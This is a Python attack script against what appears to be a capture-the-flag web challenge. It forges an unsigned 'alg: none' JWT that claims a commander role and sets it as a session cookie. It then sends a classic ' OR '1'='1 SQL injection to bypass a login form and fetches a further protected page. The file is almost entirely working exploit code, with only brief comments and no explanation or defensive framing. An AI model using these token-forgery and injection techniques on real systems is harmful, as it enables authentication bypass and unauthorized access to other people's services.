import requests, json, base64, re

def b64url(d):
    if isinstance(d,str): d=d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def forge(role='commander', level=2, gates=[]):
    h=b64url(json.dumps({'alg':'none','typ':'JWT'}))
    p=b64url(json.dumps({'user':'abhimanyu','role':role,'access_level':level,'gates':gates}))
    return f'{h}.{p}.'

s=requests.Session()
s.cookies.set('chakravyuh_token',forge(),domain='chakravyuh-the-7-gates.onrender.com')

# Pass gate 2 with SQLi
s.post('https://chakravyuh-the-7-gates.onrender.com/warroom',
    data={'username':"' OR '1'='1",'passkey':'x'},timeout=12)

print("Cookies after gate2:", {c.name: c.value[:80] for c in s.cookies})

# Gate 3 - scout
r = s.get('https://chakravyuh-the-7-gates.onrender.com/scout', timeout=15)
print('\n=== /scout ===')
print(r.text[:5000])
